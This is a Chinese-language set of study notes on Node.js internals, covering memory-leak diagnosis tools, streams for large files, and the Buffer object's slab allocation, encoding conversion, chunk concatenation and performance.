<p>遇到这种场景，表层的解决方案是换用消费速度更高的技术。在日志收集的案例中，换用文件写入日志的方式会更高效。需要注意的是，如果生产速度因为某些原因突然激增，或者消费速度因为突然的系统故障降低，内存泄漏还是可能出现的。深度的解决方案应该是监控队列的长度，一旦堆积，应当通过监控系统产生报警并通知相关人员。另一个解决方案是任意异步调用都应该包含超时机制，一旦在限定的时间内未完成响应，通过回调函数传递超时异常，使得任意异步调用的回调都具备可控的响应时间，给消费速度一个下限值。</p>
<p>对于Bagpipe而言，它提供了超时模式和拒绝模式。启用超时模式时，调用加入到队列中就开始计时，超时就直接响应一个超时错误。启用拒绝模式时，当队列拥塞时，新到来的调用会直接响应拥塞错误。这两种模式都能够有效地防止队列拥塞导致的内存泄漏问题。</p>
<h3 id="5-5-内存泄漏排查"><a href="#5-5-内存泄漏排查" class="headerlink" title="5.5 内存泄漏排查"></a>5.5 内存泄漏排查</h3><p>在Node中，由于V8的堆内存大小的限制，它对内存泄漏非常敏感。当在线服务的请求量变大时，哪怕是一个字节的泄漏都会导致内存占用过高。</p>
<p><code>v8-profiler</code> 。由Danny Coates提供，它可以用于对V8堆内存抓取快照和对CPU进行分析，但该项目已经有3年没有维护了。</p>
<p><code>node-heapdump</code>。这是Node核心贡献者之一Ben Noordhuis编写的模块，它允许对V8堆内存抓取快照，用于事后分析。</p>
<p><code>node-mtrace</code> 。由Jimb Esser提供，它使用了GCC的mtrace工具来分析堆的使用。</p>
<p><code>dtrace</code> 。在Joyent的SmartOS系统上，有完善的dtrace工具用来分析内存泄漏。</p>
<p><code>node-memwatch</code> 。来自Mozilla的Lloyd Hilaiel贡献的模块，采用WTFPL许可发布。</p>
<h3 id="5-5-2-node-memwatch"><a href="#5-5-2-node-memwatch" class="headerlink" title="5.5.2 node-memwatch"></a>5.5.2 node-memwatch</h3><p>最终得到的leak事件的信息只能告知我们应用中存在内存泄漏，具体问题产生在何处还需要从V8的堆内存上定位。node-memwatch提供了抓取快照和比较快照的功能，它能够比较堆上对象的名称和分配数量，从而找出导致内存泄漏的元凶。</p>
<h3 id="5-6-大内存应用"><a href="#5-6-大内存应用" class="headerlink" title="5.6 大内存应用"></a>5.6 大内存应用</h3><p>在Node中，不可避免地还是会存在操作大文件的场景。由于Node的内存限制，操作大文件也需要小心，好在Node提供了stream模块用于处理大文件。<br>stream模块是Node的原生模块，直接引用即可。stream继承自EventEmitter，具备基本的自定义事件功能，同时抽象出标准的事件和方法。它分可读和可写两种。Node中的大多数模块都有stream的应用，比如fs的createReadStream()和createWriteStream()方法可以分别用于创建文件的可读流和可写流，process模块中的stdin和stdout则分别是可读流和可写流的示例。由于V8的内存限制，我们无法通过fs.readFile()和fs.writeFile()直接进行大文件的操作，而改用fs.createReadStream()和fs.createWriteStream()方法通过流的方式实现对大文件的操作</p>
<p>如果不需要进行字符串层面的操作，则不需要借助V8来处理，可以尝试进行纯粹的Buffer操作，这不会受到V8堆内存的限制。但是这种大片使用内存的情况依然要小心，即使V8不限制堆内存的大小，物理内存依然有限制。</p>
<h2 id="第06章-理解Buffer"><a href="#第06章-理解Buffer" class="headerlink" title="第06章 理解Buffer"></a>第06章 理解Buffer</h2><p>文件和网络I/O对于前端开发者而言都是不曾有的应用场景，因为前端只需做一些简单的字符串操作或DOM操作基本就能满足业务需求，在ECMAScript规范中，也没有对这些方面做任何的定义，只有CommonJS中有部分二进制的定义。由于应用场景不同，在Node中，应用需要处理网络协议、操作数据库、处理图片、接收上传文件等，在网络流和文件的操作中，还要处理大量二进制数据，JavaScript自有的字符串远远不能满足这些需求，于是Buffer对象应运而生。</p>
<h3 id="6-1-Buffer结构"><a href="#6-1-Buffer结构" class="headerlink" title="6.1 Buffer结构"></a>6.1 Buffer结构</h3><p>Buffer是一个像Array的对象，但它主要用于操作字节</p>
<h3 id="6-1-1-模块结构"><a href="#6-1-1-模块结构" class="headerlink" title="6.1.1 模块结构"></a>6.1.1 模块结构</h3><p>Buffer是一个典型的JavaScript与C++结合的模块，它将性能相关部分用C++实现，将非性能相关的部分用JavaScript实现，如图6-1所示。<br>图6-1　Buffer的分工</p>
<p>Buffer所占用的内存不是通过V8分配的，属于堆外内存。由于V8垃圾回收性能的影响，将常用的操作对象用更高效和专有的内存分配回收策略来管理是个不错的思路。</p>
<p>由于Buffer太过常见，Node在进程启动时就已经加载了它，并将其放在全局对象（global）上。所以在使用Buffer时，无须通过require()即可直接使用。</p>
<h3 id="6-1-2-Buffer对象"><a href="#6-1-2-Buffer对象" class="headerlink" title="6.1.2 Buffer对象"></a>6.1.2 Buffer对象</h3><p>Buffer受Array类型的影响很大，可以访问length属性得到长度，也可以通过下标访问元素，在构造对象时也十分相似，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(<span class="number">100</span>);</div><div class="line"><span class="built_in">console</span>.log(buf.length); <span class="comment">// =&gt; 100</span></div></pre></td></tr></table></figure>
<p>上述代码分配了一个长100字节的Buffer对象。可以通过下标访问刚初始化的Buffer的元素，代码如下：console.log(buf[10]);<br>这里会得到一个比较奇怪的结果，它的元素值是一个0到255的随机值。</p>
<p>值得注意的是，如果给元素赋值不是0到255的整数而是小数时会怎样呢？示例代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">buf[<span class="number">20</span>] = <span class="number">-100</span>;</div><div class="line"><span class="built_in">console</span>.log(buf[<span class="number">20</span>]); <span class="comment">// 156</span></div><div class="line">buf[<span class="number">21</span>] = <span class="number">300</span>;</div><div class="line"><span class="built_in">console</span>.log(buf[<span class="number">21</span>]); <span class="comment">// 44</span></div><div class="line">buf[<span class="number">22</span>] = <span class="number">3.1415</span>;</div><div class="line"><span class="built_in">console</span>.log(buf[<span class="number">22</span>]); <span class="comment">// 3</span></div></pre></td></tr></table></figure>
<p>给元素的赋值如果小于0，就将该值逐次加256，直到得到一个0到255之间的整数。如果得到的数值大于255，就逐次减256，直到得到0~255区间内的数值。如果是小数，舍弃小数部分，只保留整数部分。</p>
<h3 id="6-1-3-Buffer内存分配"><a href="#6-1-3-Buffer内存分配" class="headerlink" title="6.1.3 Buffer内存分配"></a>6.1.3 Buffer内存分配</h3><p>Buffer内存分配</p>
<p>Buffer对象的内存分配不是在V8的堆内存中，而是在Node的C++层面实现内存的申请的。因为处理大量的字节数据不能采用需要一点内存就向操作系统申请一点内存的方式，这可能造成大量的内存申请的系统调用，对操作系统有一定压力。为此Node在内存的使用上应用的是在C++层面申请内存、在JavaScript中分配内存的策略。为了高效地使用申请来的内存，Node采用了slab分配机制。slab是一种动态内存管理机制，最早诞生于SunOS操作系统（Solaris）中，目前在一些*nix操作系统中有广泛的应用，如FreeBSD和Linux。<br>简单而言，slab就是一块申请好的固定大小的内存区域。slab具有如下3种状态。</p>
<p>full：完全分配状态。<br>partial：部分分配状态。<br>empty：没有被分配状态。</p>
<p>当我们需要一个Buffer对象，可以通过以下方式分配指定大小的Buffer对象：new Buffer(size);</p>
<p>Node以8 KB为界限来区分Buffer是大对象还是小对象：Buffer.poolSize = 8 * 1024;</p>
<p>这个8 KB的值也就是每个slab的大小值，在JavaScript层面，以它作为单位单元进行内存的分配。</p>
<p>分配小Buffer对象</p>
<p>如果指定Buffer的大小少于8 KB，Node会按照小对象的方式进行分配。Buffer的分配过程中主要使用一个局部变量pool作为中间处理对象，处于分配状态的slab单元都指向它。以下是分配一个全新的slab单元的操作，它会将新申请的SlowBuffer对象指向它：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> pool;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocPool</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  pool = <span class="keyword">new</span> SlowBuffer(Buffer.poolSize);</div><div class="line">  pool.used = <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再次创建一个Buffer对象时，构造过程中将会判断这个slab的剩余空间是否足够。如果足够，使用剩余空间，并更新slab的分配状态。下面的代码创建了一个新的Buffer对象，它会引起一次slab分配：</p>
<p>如果slab剩余的空间不够，将会构造新的slab，原slab中剩余的空间会造成浪费。例如，第一次构造1字节的Buffer对象，第二次构造8192字节的Buffer对象，由于第二次分配时slab中的空间不够，所以创建并使用新的slab，第一个slab的8 KB将会被第一个1字节的Buffer对象独占。下面的代码一共使用了两个slab单元：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">new</span> Buffer(<span class="number">1</span>);</div><div class="line"><span class="keyword">new</span> Buffer(<span class="number">8192</span>);</div></pre></td></tr></table></figure>
<p>这里要注意的事项是，由于同一个slab可能分配给多个Buffer对象使用，只有这些小Buffer对象在作用域释放并都可以回收时，slab的8 KB空间才会被回收。尽管创建了1个字节的Buffer对象，但是如果不释放它，实际可能是8 KB的内存没有释放。</p>
<p>分配大Buffer对象<br>如果需要超过8 KB的Buffer对象，将会直接分配一个SlowBuffer对象作为slab单元，这个slab单元将会被这个大Buffer对象独占。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="comment">// Big buffer, just alloc one</span></div><div class="line"><span class="keyword">this</span>.parent = <span class="keyword">new</span> SlowBuffer(<span class="keyword">this</span>.length);</div><div class="line"><span class="keyword">this</span>.offset = <span class="number">0</span>;</div></pre></td></tr></table></figure>
<p>这里的SlowBuffer类是在C++中定义的，虽然引用buffer模块可以访问到它，但是不推荐直接操作它，而是用Buffer替代。</p>
<p>上面提到的Buffer对象都是JavaScript层面的，能够被V8的垃圾回收标记回收。但是其内部的parent属性指向的SlowBuffer对象却来自于Node自身C++中的定义，是C++层面上的Buffer对象，所用内存不在V8的堆中。</p>
<p>简单而言，真正的内存是在Node的C++层面提供的，JavaScript层面只是使用它。当进行小而频繁的Buffer操作时，采用slab的机制进行预先申请和事后分配，使得JavaScript到操作系统之间不必有过多的内存申请方面的系统调用。对于大块的Buffer而言，则直接使用C++层面提供的内存，而无需细腻的分配操作。</p>
<h3 id="6-2-Buffer的转换"><a href="#6-2-Buffer的转换" class="headerlink" title="6.2 Buffer的转换"></a>6.2 Buffer的转换</h3><p>Buffer对象可以与字符串之间相互转换。</p>
<h3 id="6-2-1-字符串转Buffer"><a href="#6-2-1-字符串转Buffer" class="headerlink" title="6.2.1 字符串转Buffer"></a>6.2.1 字符串转Buffer</h3><p>字符串转Buffer<br>字符串转Buffer对象主要是通过构造函数完成的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">new</span> Buffer(str, [encoding]);</div></pre></td></tr></table></figure>
<p>通过构造函数转换的Buffer对象，存储的只能是一种编码类型。encoding参数不传递时，默认按UTF-8编码进行转码和存储。</p>
<p>一个Buffer对象可以存储不同编码类型的字符串转码的值，调用write()方法可以实现该目的</p>
<p>由于可以不断写入内容到Buffer对象中，并且每次写入可以指定编码，所以Buffer对象中可以存在多种编码转化后的内容。需要小心的是，每种编码所用的字节长度不同，将Buffer反转回字符串时需要谨慎处理。</p>
<h3 id="6-2-2-Buffer转字符串"><a href="#6-2-2-Buffer转字符串" class="headerlink" title="6.2.2 Buffer转字符串"></a>6.2.2 Buffer转字符串</h3><p>实现Buffer向字符串的转换也十分简单，Buffer对象的toString()可以将Buffer对象转换为字符串</p>
<p>比较精巧的是，可以设置encoding（默认为UTF-8）、start、end这3个参数实现整体或局部的转换。如果Buffer对象由多种编码写入，就需要在局部指定不同的编码，才能转换回正常的编码。</p>
<h3 id="6-2-3-Buffer不支持的编码类型"><a href="#6-2-3-Buffer不支持的编码类型" class="headerlink" title="6.2.3 Buffer不支持的编码类型"></a>6.2.3 Buffer不支持的编码类型</h3><p>目前比较遗憾的是，Node的Buffer对象支持的编码类型有限，只有少数的几种编码类型可以在字符串和Buffer之间转换。为此，Buffer提供了一个isEncoding()函数来判断编码是否支持转换：<br>Buffer.isEncoding(encoding)将编码类型作为参数传入上面的函数，如果支持转换返回值为true，否则为false。很遗憾的是，在中国常用的GBK、GB2312和BIG-5编码都不在支持的行列中。</p>
<p>对于不支持的编码类型，可以借助Node生态圈中的模块完成转换。iconv和iconv-lite两个模块可以支持更多的编码类型转换，包括Windows 125系列、ISO-8859系列、IBM/DOS代码页系列、Macintosh系列、KOI8系列，以及Latin1、US-ASCII，也支持宽字节编码GBK和GB2312。</p>
<p>iconv-lite采用纯JavaScript实现，iconv则通过C++调用libiconv库完成。前者比后者更轻量，无须编译和处理环境依赖直接使用。在性能方面，由于转码都是耗用CPU，在V8的高性能下，少了C++到JavaScript的层次转换，纯JavaScript的性能比C++实现得更好。</p>
<p>另外，iconv和iconv-lite对无法转换的内容进行降级处理时的方案不尽相同。iconv-lite无法转换的内容如果是多字节，会输出&lt;图&gt;；如果是单字节，则输出?。iconv则有三级降级策略，会尝试翻译无法转换的内容，或者忽略这些内容。如果不设置忽略，iconv对于无法转换的内容将会得到EILSEQ异常</p>
<h3 id="6-3-Buffer的拼接"><a href="#6-3-Buffer的拼接" class="headerlink" title="6.3 Buffer的拼接"></a>6.3 Buffer的拼接</h3><p>Buffer的拼接<br>Buffer在使用场景中，通常是以一段一段的方式传输。</p>
<p>以下是常见的从输入流中读取内容的示例代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'test.md'</span>);</div><div class="line"><span class="keyword">var</span> data = <span class="string">''</span>;</div><div class="line">rs.on(<span class="string">"data"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">trunk</span>)</span>&#123;</div><div class="line">  data += trunk;</div><div class="line">&#125;);</div><div class="line">rs.on(<span class="string">"end"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>上面这段代码常见于国外，用于流读取的示范，data事件中获取的chunk对象即是Buffer对象。对于初学者而言，容易将Buffer当做字符串来理解，所以在接受上面的示例时不会觉得有任何异常。</p>
<p>一旦输入流中有宽字节编码时，问题就会暴露出来。如果你在通过Node开发的网站上看到&lt;图&gt;乱码符号，那么该问题的起源多半来自于这里。<br>这里潜藏的问题在于如下这句代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">data += trunk;</div></pre></td></tr></table></figure>
<p>这句代码里隐藏了toString()操作，它等价于如下的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">data= data.toString() + trunk.toString();</div></pre></td></tr></table></figure>
<p>值得注意的是，外国人的语境通常是指英文环境，在他们的场景下，这个toString()不会造成任何问题。但对于宽字节的中文，却会形成问题。</p>
<h3 id="6-3-1-乱码是如何产生的"><a href="#6-3-1-乱码是如何产生的" class="headerlink" title="6.3.1 乱码是如何产生的"></a>6.3.1 乱码是如何产生的</h3><p>上面的诗歌中，“月”、“是”、“望”、“低”4个字没有被正常输出，取而代之的是3个&lt;图&gt;。产生这个输出结果的原因在于文件可读流在读取时会逐个读取Buffer。这首诗的原始Buffer应存储为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">&lt;Buffer e5 ba <span class="number">8</span>a e5 <span class="number">89</span> <span class="number">8</span>d e6 <span class="number">98</span> <span class="number">8</span>e e6 <span class="number">9</span>c <span class="number">88</span> e5 <span class="number">85</span> <span class="number">89</span> ef bc <span class="number">8</span>c e7 <span class="number">96</span> <span class="number">91</span> e6 <span class="number">98</span></div><div class="line">af e5 <span class="number">9</span>c b0 e4 b8 <span class="number">8</span>a e9 <span class="number">9</span>c <span class="number">9</span>c ef bc <span class="number">9</span>b e4 b8 be e5 a4 b4 e6 <span class="number">9</span>c <span class="number">9</span>b e6 <span class="number">98</span> <span class="number">8</span>e e6</div><div class="line"><span class="number">9</span>c <span class="number">88</span> ...&gt;</div></pre></td></tr></table></figure>
<p>由于我们限定了Buffer对象的长度为11，因此只读流需要读取7次才能完成完整的读取，结果是以下几个Buffer对象依次输出：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">&lt;Buffer e5 ba <span class="number">8</span>a e5 <span class="number">89</span> <span class="number">8</span>d e6 <span class="number">98</span> <span class="number">8</span>e e6 <span class="number">9</span>c&gt;<span class="xml"><span class="tag">&lt;<span class="name">Buffer</span> <span class="attr">88</span> <span class="attr">e5</span> <span class="attr">85</span> <span class="attr">89</span> <span class="attr">ef</span> <span class="attr">bc</span> <span class="attr">8c</span></span></span></div><div class="line"><span class="attr">e7</span> <span class="attr">96</span> <span class="attr">91</span> <span class="attr">e6</span>&gt;</div><div class="line">...</div></pre></td></tr></table></figure>
<p>上文提到的<code>buf.toString()</code> 方法默认以UTF-8为编码，中文字在UTF-8下占3个字节。所以第一个Buffer对象在输出时，只能显示3个字符，Buffer中剩下的2个字节（e6 9c）将会以乱码的形式显示。第二个Buffer对象的第一个字节也不能形成文字，只能显示乱码。于是形成一些文字无法正常显示的问题。<br>在这个示例中我们构造了11这个限制，但是对于任意长度的Buffer而言，宽字节字符串都有可能存在被截断的情况，只不过Buffer的长度越大出现的概率越低而已，但该问题依然不可忽视。</p>
<h3 id="6-3-2-setEncoding-与string-decoder"><a href="#6-3-2-setEncoding-与string-decoder" class="headerlink" title="6.3.2 setEncoding()与string_decoder()"></a>6.3.2 setEncoding()与string_decoder()</h3><p>setEncoding()与string_decoder()</p>
<p>在看过上述的示例后，也许我们忘记了可读流还有一个设置编码的方法setEncoding()，示例如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">readable.setEncoding(encoding)</div></pre></td></tr></table></figure>
<p>该方法的作用是让data事件中传递的不再是一个Buffer对象，而是编码后的字符串。为此，我们继续改进前面诗歌的程序，添加setEncoding()的步骤如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> rs = fs.createReadStream(<span class="string">'test.md'</span>, &#123;</div><div class="line">  <span class="attr">highWaterMark</span>: <span class="number">11</span></div><div class="line">&#125;);</div><div class="line">rs.setEncoding(<span class="string">'utf8'</span>);</div></pre></td></tr></table></figure>
<p>要知道，无论如何设置编码，触发data事件的次数依旧相同，这意味着设置编码并未改变按段读取的基本方式。</p>
<p>事实上，在调用setEncoding()时，可读流对象在内部设置了一个decoder对象。每次data事件都通过该decoder对象进行Buffer到字符串的解码，然后传递给调用者。是故设置编码后，data不再收到原始的Buffer对象。但是这依旧无法解释为何设置编码后乱码问题被解决掉了，因为在前述分析中，无论如何转码，总是存在宽字节字符串被截断的问题。最终乱码问题得以解决，还是在于decoder的神奇之处。decoder对象来自于string_decoder模块StringDecoder的实例对象。它神奇的原理是什么，下面我们以代码来说明：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> StringDecoder = <span class="built_in">require</span>(<span class="string">'string_decoder'</span>).StringDecoder;</div><div class="line"><span class="keyword">var</span> decoder = <span class="keyword">new</span> StringDecoder(<span class="string">'utf8'</span>);</div><div class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> Buffer([<span class="number">0xE5</span>, <span class="number">0xBA</span>, <span class="number">0x8A</span>, <span class="number">0xE5</span>, <span class="number">0x89</span>, <span class="number">0x8D</span>, <span class="number">0xE6</span>, <span class="number">0x98</span>, <span class="number">0x8E</span>, <span class="number">0xE6</span>, <span class="number">0x9C</span>]);</div><div class="line"><span class="built_in">console</span>.log(decoder.write(buf1)); <span class="comment">// =&gt; 床前明</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">var</span> buf2 = <span class="keyword">new</span> Buffer([<span class="number">0x88</span>, <span class="number">0xE5</span>, <span class="number">0x85</span>, <span class="number">0x89</span>, <span class="number">0xEF</span>, <span class="number">0xBC</span>, <span class="number">0x8C</span>, <span class="number">0xE7</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xE6</span>]);</div><div class="line"><span class="built_in">console</span>.log(decoder.write(buf2)); <span class="comment">// =&gt; 月光，疑</span></div></pre></td></tr></table></figure>
<p>我将前文提到的前两个Buffer对象写入decoder中。奇怪的地方在于“月”的转码并没有如平常一样在两个部分分开输出。StringDecoder在得到编码后，知道宽字节字符串在UTF-8编码下是以3个字节的方式存储的，所以第一次write()时，只输出前9个字节转码形成的字符，“月”字的前两个字节被保留在StringDecoder实例内部。第二次write()时，会将这2个剩余字节和后续11个字节组合在一起，再次用3的整数倍字节进行转码。于是乱码问题通过这种中间形式被解决了。</p>
<p>奇妙，但是它也并非万能药，它目前只能处理UTF-8、Base64和UCS-2/UTF-16LE这3种编码。所以，通过setEncoding()的方式不可否认能解决大部分的乱码问题，但并不能从根本上解决该问题。</p>
<h3 id="6-3-3-正确拼接Buffer"><a href="#6-3-3-正确拼接Buffer" class="headerlink" title="6.3.3 正确拼接Buffer"></a>6.3.3 正确拼接Buffer</h3><p>正确拼接Buffer<br>淘汰掉setEncoding()方法后，剩下的解决方案只有将多个小Buffer对象拼接为一个Buffer对象，然后通过iconv-lite一类的模块来转码这种方式。+=的方式显然不行，那么正确的Buffer拼接方法应该如下面展示的形式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> chunks = [];</div><div class="line"><span class="keyword">var</span> size = <span class="number">0</span>;</div><div class="line">res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">  chunks.push(chunk);</div><div class="line">  size += chunk.length;</div><div class="line">&#125;);</div><div class="line">res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> buf = Buffer.concat(chunks, size);</div><div class="line">  <span class="keyword">var</span> str = iconv.decode(buf, <span class="string">'utf8'</span>);</div><div class="line">  <span class="built_in">console</span>.log(str);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>正确的拼接方式是用一个数组来存储接收到的所有Buffer片段并记录下所有片段的总长度，然后调用Buffer.concat()方法生成一个合并的Buffer对象。Buffer.concat()方法封装了从小Buffer对象向大Buffer对象的复制过程，实现十分细腻，值得围观学习：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">Buffer.concat = <span class="function"><span class="keyword">function</span> (<span class="params">list, length</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(list)) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Usage: Buffer.concat(list, [length])'</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (list.length === <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Buffer(<span class="number">0</span>);</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (list.length === <span class="number">1</span>) &#123;</div><div class="line">    <span class="keyword">return</span> list[<span class="number">0</span>];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> length !== <span class="string">'number'</span>) &#123;</div><div class="line">    length = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">      <span class="keyword">var</span> buf = list[i];</div><div class="line">      length += buf.length;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> buffer = <span class="keyword">new</span> Buffer(length);</div><div class="line">  <span class="keyword">var</span> pos = <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> buf = list[i];</div><div class="line">    buf.copy(buffer, pos);</div><div class="line">    pos += buf.length;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> buffer;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="6-4-Buffer与性能"><a href="#6-4-Buffer与性能" class="headerlink" title="6.4 Buffer与性能"></a>6.4 Buffer与性能</h3><p>Buffer与性能</p>
<p>Buffer在文件I/O和网络I/O中运用广泛，尤其在网络传输中，它的性能举足轻重。在应用中，我们通常会操作字符串，但一旦在网络中传输，都需要转换为Buffer，以进行二进制数据传输。在Web应用中，字符串转换到Buffer是时时刻刻发生的，提高字符串到Buffer的转换效率，可以很大程度地提高网络吞吐率。</p>
<p>在展开Buffer与网络传输的关系之前，我们可以先来进行一次性能测试。下面的例子中构造了一个10 KB大小的字符串。我们首先通过纯字符串的方式向客户端发送，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> helloworld = <span class="string">""</span>;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">10</span>; i++) &#123;</div><div class="line">  helloworld += <span class="string">"a"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// helloworld = new Buffer(helloworld);</span></div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>);</div><div class="line">  res.end(helloworld);</div><div class="line">&#125;).listen(<span class="number">8001</span>);</div></pre></td></tr></table></figure>
<p>我们通过ab进行一次性能测试，发起200个并发客户端：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">ab -c 200 -t 100</div></pre></td></tr></table></figure>
<p><a href="http://127.0.0.1:8001/" target="_blank" rel="external">http://127.0.0.1:8001/</a></p>
<p>得到的测试结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">HTML transferred: 512000000 bytes</div><div class="line">Requests per second: 2527.64 [#/sec] (mean)Time per request: 79.125 [ms] (mean)</div><div class="line">Time per request: 0.396 [ms] (mean, across all concurrent requests)Transfer</div><div class="line">rate: 25370.16 [Kbytes/sec] received</div></pre></td></tr></table></figure>
<p>测试的QPS（每秒查询次数）是2527.64，传输率为每秒25 370.16 KB。接下来我们注释掉</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">helloworld = <span class="keyword">new</span> Buffer(helloworld);</div></pre></td></tr></table></figure>
<p>使向客户端输出的是一个Buffer对象，无须在每次响应时进行转换。再次进行性能测试的结果如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Total transferred: 513900000 bytesHTML transferred: 512000000 bytes</div><div class="line">Requests per second: 4843.28 [#/sec] (mean)Time per request: 41.294 [ms] (mean)</div><div class="line">Time per request: 0.206 [ms] (mean, across all concurrent requests)Transfer rate:</div><div class="line">48612.56 [Kbytes/sec] received</div></pre></td></tr></table></figure>
<p>QPS的提升到4843.28，传输率为每秒48 612.56KB，性能提高近一倍。</p>
<p>通过预先转换静态内容为Buffer对象，可以有效地减少CPU的重复使用，节省服务器资源。在Node构建的Web应用中，可以选择将页面中的动态内容和静态内容分离，静态内容部分可以通过预先转换为Buffer的方式，使性能得到提升。由于文件自身是二进制数据，所以在不需要改变内容的场景下，尽量只读取Buffer，然后直接传输，不做额外的转换，避免损耗。</p>
<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>Buffer的使用除了与字符串的转换有性能损耗外，在文件的读取时，有一个<code>highWaterMark</code> 设置对性能的影响至关重要。在<code>fs.createReadStream(path, opts)</code> 时，我们可以传入一些参数，</p>
<p><code>fs.createReadStream()</code> 的工作方式是在内存中准备一段Buffer，然后在fs.read()读取时逐步从磁盘中将字节复制到Buffer中。完成一次读取时，则从这个Buffer中通过slice()方法取出部分数据作为一个小Buffer对象，再通过data事件传递给调用方。如果Buffer用完，则重新分配一个；如果还有剩余，则继续使用。下面为分配一个新的Buffer对象的操作：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> pool;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocNewPool</span>(<span class="params">poolSize</span>) </span>&#123;</div><div class="line">  pool = <span class="keyword">new</span> Buffer(poolSize);</div><div class="line">  pool.used = <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在理想的状况下，每次读取的长度就是用户指定的highWaterMark。但是有可能读到了文件结尾，或者文件本身就没有指定的highWaterMark那么大，这个预先指定的Buffer对象将会有部分剩余，不过好在这里的内存可以分配给下次读取时使用。pool是常驻内存的，只有当pool单元剩余数量小于128（kMinPoolSpace）字节时，才会重新分配一个新的Buffer对</p>
<p>Node源代码中分配新的Buffer对象的判断条件如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (!pool || pool.length - pool.used &lt; kMinPoolSpace) &#123;</div><div class="line">  <span class="comment">// discard the old pool</span></div><div class="line">  pool = <span class="literal">null</span>;</div><div class="line">  allocNewPool(<span class="keyword">this</span>._readableState.highWaterMark);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里与Buffer的内存分配比较类似，highWaterMark的大小对性能有两个影响的点。</p>
<p><code>highWaterMark</code> 设置对Buffer内存的分配和使用有一定影响。<br><code>highWaterMark</code> 设置过小，可能导致系统调用次数过多。</p>
<p>文件流读取基于Buffer分配，Buffer则基于SlowBuffer分配，这可以理解为两个维度的分配策略。如果文件较小（小于8 KB），有可能造成slab未能完全使用。<br>由于fs.createReadStream()内部采用fs.read()实现，将会引起对磁盘的系统调用，对于大文件而言，highWaterMark的大小决定会触发系统调用和data事件的次数</p>
